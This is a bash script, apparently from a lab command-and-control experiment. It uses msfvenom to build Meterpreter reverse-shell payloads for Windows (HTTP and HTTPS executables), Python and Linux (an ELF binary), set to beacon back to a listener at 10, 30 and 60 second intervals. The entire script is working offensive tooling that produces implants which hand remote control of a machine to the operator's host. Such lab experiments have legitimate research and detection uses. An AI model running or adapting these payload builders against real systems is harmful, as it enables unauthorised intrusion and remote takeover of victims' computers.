#!/bin/bash

# Configuration
LHOST="192.168.56.10"
HTTP_PORT="8080"
HTTPS_PORT="8443"
TCP_PORT="4444"
INTERVALS=(10 30 60)
OUTPUT_DIR="/home/kali/Desktop/c2/msf-c2/payloads"

# Create output directory
mkdir -p $OUTPUT_DIR

echo "[*] Generating C2 Experiment Payloads with Multiple Intervals..."

for INTERVAL in "${INTERVALS[@]}"; do
    echo "--------------------------------------------------"
    echo "[*] Processing $INTERVAL second interval..."
    echo "--------------------------------------------------"

    # 1. Windows Reverse HTTP
    echo "[+] Generating Windows HTTP Beacon (${INTERVAL}s)..."
    msfvenom -p windows/meterpreter/reverse_http \
        LHOST=$LHOST LPORT=$HTTP_PORT \
        HttpWait=$INTERVAL \
        SessionCommunicationTimeout=10 \
        SessionExpirationTimeout=3600 \
        -f exe -o $OUTPUT_DIR/windows_beacon_${INTERVAL}s.exe

    # 2. Windows Reverse HTTPS
    echo "[+] Generating Windows HTTPS Beacon (${INTERVAL}s)..."
    msfvenom -p windows/meterpreter/reverse_https \
        LHOST=$LHOST LPORT=$HTTPS_PORT \
        HttpWait=$INTERVAL \
        SessionCommunicationTimeout=10 \
        SessionExpirationTimeout=3600 \
        -f exe -o $OUTPUT_DIR/windows_beacon_https_${INTERVAL}s.exe

    # 3. Python Multi-Platform Beacon
    echo "[+] Generating Python Beacon (${INTERVAL}s)..."
    msfvenom -p python/meterpreter/reverse_http \
        LHOST=$LHOST LPORT=$HTTP_PORT \
        HttpWait=$INTERVAL \
        -f raw -o $OUTPUT_DIR/beacon_${INTERVAL}s.py
done

# 4. Linux Reverse TCP (MX Linux Target)
# Note: TCP doesn't have native "Wait" like HTTP in standard meterpreter
echo "--------------------------------------------------"
echo "[+] Generating Linux TCP Beacon (MX Linux)..."
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=$LHOST LPORT=$TCP_PORT \
    -f elf -o $OUTPUT_DIR/linux_beacon

echo "--------------------------------------------------"
echo "[*] Payload generation complete!"
echo "[*] Payloads saved in: $OUTPUT_DIR"
ls -lh $OUTPUT_DIR
